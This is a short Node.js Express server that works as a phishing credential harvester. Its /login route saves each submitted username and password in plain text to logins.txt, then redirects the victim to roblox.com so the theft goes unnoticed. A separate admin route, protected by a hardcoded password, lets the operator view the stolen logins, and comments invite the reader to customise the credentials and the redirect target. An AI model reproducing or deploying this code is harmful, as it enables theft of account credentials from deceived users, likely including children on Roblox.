const express = require("express");
const fs = require("fs");
const path = require("path");

const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files
app.use(express.static(__dirname));

// Basic Auth middleware for admin route
function basicAuth(req, res, next) {
  const auth = { login: "admin", password: "471477en" }; // <-- Change your username & password here

  const b64auth = (req.headers.authorization || "").split(" ")[1] || "";
  const [login, password] = Buffer.from(b64auth, "base64").toString().split(":");

  if (login && password && login === auth.login && password === auth.password) {
    return next();
  }

  res.set("WWW-Authenticate", 'Basic realm="Admin Area"');
  res.status(401).send("Authentication required.");
}

// Routes
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.get("/main.css", (req, res) => {
  res.sendFile(path.join(__dirname, "main.css"));
});

app.get("/script.js", (req, res) => {
  res.sendFile(path.join(__dirname, "script.js"));
});

app.post("/login", (req, res) => {
  const { username, password } = req.body;
  const logEntry = `Username: ${username}, Password: ${password}\n`;

  fs.appendFile("logins.txt", logEntry, (err) => {
    if (err) {
      console.error("Error saving login:", err);
      return res.status(500).send("Failed to save.");
    }
    console.log("Login saved:", logEntry.trim());

    // Redirect to another website after successful submission
    res.redirect("https://roblox.com"); // <-- change to your desired URL
  });
});

// Protected admin route to view logins.txt
app.get("/admin/logins", basicAuth, (req, res) => {
  const logFile = path.join(__dirname, "logins.txt");

  if (fs.existsSync(logFile)) {
    res.sendFile(logFile);
  } else {
    res.status(404).send("Log file not found.");
  }
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
